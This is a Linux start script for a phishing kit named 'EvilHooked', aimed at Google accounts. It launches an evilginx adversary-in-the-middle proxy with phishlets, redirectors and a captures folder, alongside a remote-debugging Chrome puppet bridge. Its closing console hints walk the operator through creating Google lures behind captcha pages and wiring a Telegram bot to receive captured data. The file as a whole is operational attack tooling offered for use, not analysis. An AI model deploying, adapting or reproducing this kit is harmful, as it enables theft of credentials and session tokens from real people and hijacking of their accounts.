#!/usr/bin/env bash
# EvilHooked Google kit — Linux start (ports 53/443/9092 + bridge :1000)
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
export EVILHOOKED_ROOT="$ROOT"
export PHISHFORGE_ROOT="$ROOT"
export EVILHOOKED_PUPPET_CONFIG="$ROOT/evilhooked/puppet-google.json"
export PHISHFORGE_PUPPET_CONFIG="$EVILHOOKED_PUPPET_CONFIG"

CFG="$EVILHOOKED_PUPPET_CONFIG"
PROFILE="$ROOT/evilhooked/chrome-profile-cdp"
CAPTURE="$ROOT/evilhooked/captures"
mkdir -p "$PROFILE" "$CAPTURE"

# Keep relative paths in JSON; strip BOM only (Node JSON.parse rejects it).
python3 - <<PY
from pathlib import Path
p = Path(r"""$CFG""")
raw = p.read_bytes()
if raw.startswith(b"\xef\xbb\xbf"):
    p.write_bytes(raw[3:])
print("config ok:", p, "(paths resolved from EVILHOOKED_ROOT at runtime)")
PY

# Stop prior instances
pkill -f 'evilhooked/evilginx/evilginx' 2>/dev/null || true
pkill -f 'puppet-bridge/src/index.js' 2>/dev/null || true
pkill -f 'chrome-profile-cdp|remote-debugging-port=9222' 2>/dev/null || true
sleep 1

bash "$ROOT/evilhooked/start-puppet-chrome.sh" || echo "WARN: CDP Chrome failed — bridge may spawn it"

EVILDIR="$ROOT/evilhooked/evilginx"
BIN="$EVILDIR/evilginx"
PHISHLETS="$EVILDIR/phishlets"
CONFIG="$ROOT/evilhooked/evilginx-config"

if [[ ! -x "$BIN" ]]; then
  if [[ -f "$EVILDIR/evilginx.exe" ]]; then
    echo "ERROR: found evilginx.exe (Windows). Build Linux binary:"
    echo "  cd $EVILDIR && go build -o evilginx -mod=vendor ."
  else
    echo "ERROR: missing $BIN — build with: cd $EVILDIR && go build -o evilginx -mod=vendor ."
  fi
  exit 1
fi

# Need root for 53/443
if [[ "$(id -u)" -ne 0 ]]; then
  echo "WARN: not root — bind to 53/443 may fail. Prefer: sudo $0"
fi

REDIRS="$ROOT/evilhooked/redirectors"
mkdir -p "$REDIRS"

echo "starting evilginx..."
(cd "$EVILDIR" && "$BIN" -p "$PHISHLETS" -t "$REDIRS" -c "$CONFIG" -developer) &
EG_PID=$!
echo "evilginx pid=$EG_PID"
echo "community: https://t.me/EvilHooked"

BRIDGE_DIR="$ROOT/puppet-bridge"
BRIDGE_ENTRY="$BRIDGE_DIR/src/index.js"
if [[ ! -d "$BRIDGE_DIR/node_modules/express" ]]; then
  echo "puppet-bridge: installing npm dependencies..."
  (cd "$BRIDGE_DIR" && npm install)
fi
(cd "$BRIDGE_DIR" && node "$BRIDGE_ENTRY" "$CFG") &
BR_PID=$!
echo "bridge pid=$BR_PID"

ok=0
for i in $(seq 1 60); do
  if curl -fsS "http://127.0.0.1:1000/health" >/dev/null 2>&1; then
    curl -fsS "http://127.0.0.1:1000/health" || true
    echo
    ok=1
    break
  fi
  sleep 0.3
done
if [[ "$ok" -ne 1 ]]; then
  echo "bridge not up — check: cd puppet-bridge && npm install"
fi

echo "In evilginx console: lures create google"
echo "  lures edit N redirector captcha     # or turnstile / verify / verify2"
echo "  lures get-url N"
echo "Telegram: set telegram.botToken + telegram.chatId in evilhooked/puppet-google.json"
wait "$EG_PID"
